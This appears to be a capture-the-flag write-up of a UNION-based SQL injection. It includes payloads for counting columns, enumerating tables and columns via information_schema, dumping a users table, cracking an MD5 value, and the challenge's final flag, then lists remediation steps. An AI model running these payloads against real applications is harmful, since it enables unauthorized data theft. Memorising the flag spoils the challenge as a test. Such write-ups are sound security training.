# SQL Injection - Member_Sql_Injection

## Vulnerability:
A SQL Injection vulnerability exists that allows user-controllable input to be used in `UNION SELECT` payloads. This permitted enumeration of the database, listing of tables/columns, and extraction of data from the `users` table. A hashed value retrieved from the database was cracked and used to derive the challenge flag.

## Weakness:
- Unsanitized user input concatenated into SQL queries (no prepared statements / parameterized queries).
- Database error/output is exposed in responses, aiding enumeration.
- Credential-like values stored using weak/fast hashing (MD5), enabling offline cracking.
- No WAF or input filtering to block SQLi patterns.
- Insufficient least-privilege for the application database user.

## Exploitation:
1. Determined number of columns via incremental `UNION SELECT` attempts — discovered the response expects 2 columns.
2. Retrieved database name:
   - `1 UNION SELECT 2, database()` → `Member_Sql_Injection`
3. Enumerated tables in the current database:
   - `1 UNION SELECT NULL, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()`
   - Result included: `users`
4. Enumerated columns of `users`:
   - `1 UNION SELECT NULL, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name=CHAR(117,115,101,114,115)`
   - Columns found: `user_id, first_name, last_name, town, country, planet, Commentaire, countersign`
5. Dumped concatenated user rows:
   - `1 UNION SELECT 1, CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign) FROM users`
   - Found a `countersign` value containing MD5: `5ff9d0165b4f92b14994e5c685cdce28`
6. Cracked MD5 (`5ff9d016...`) to `FortyTwo`, converted to `fortytwo`, SHA256 produced the challenge flag.

> Note: step-by-step exploit payloads are provided here only for authorized/CTF reporting and replication in a controlled environment.

## Flag:
`10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

(Alternatively: store the flag in the `flag` file in the challenge folder. Do not include plaintext credentials in publicly shared reports.)

## PoC (requests / commands):
> Sanitized payloads used during authorized testing:
```sql
-- determine columns
1 UNION SELECT 1
1 UNION SELECT 2
1 UNION SELECT 3

-- get database name
1 UNION SELECT 2, database()

-- list tables in current database
1 UNION SELECT NULL, GROUP_CONCAT(table_name)
FROM information_schema.tables
WHERE table_schema = database() -- -

-- list columns for 'users'
1 UNION SELECT NULL, GROUP_CONCAT(column_name)
FROM information_schema.columns
WHERE table_schema = database()
AND table_name = CHAR(117,115,101,114,115) -- 'users'

-- dump concatenated user data
1 UNION SELECT 1, CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign)
FROM users


# How to Fix:

Use parameterized queries / prepared statements for all database interactions; never concatenate user input into SQL.

Apply least-privilege to the application DB user; avoid exposing metadata where not required.

Never expose raw database errors to end users; log details server-side only.

Store credentials using modern slow hashing algorithms (Argon2, bcrypt) with per-user salts; do not use MD5.

Deploy a WAF and input validation to detect and block SQLi attempts.

Implement monitoring and alerting for unusual query patterns and repeated enumeration attempts.

Conduct regular security testing (DAST/SAST) and code reviews targeting injection risks.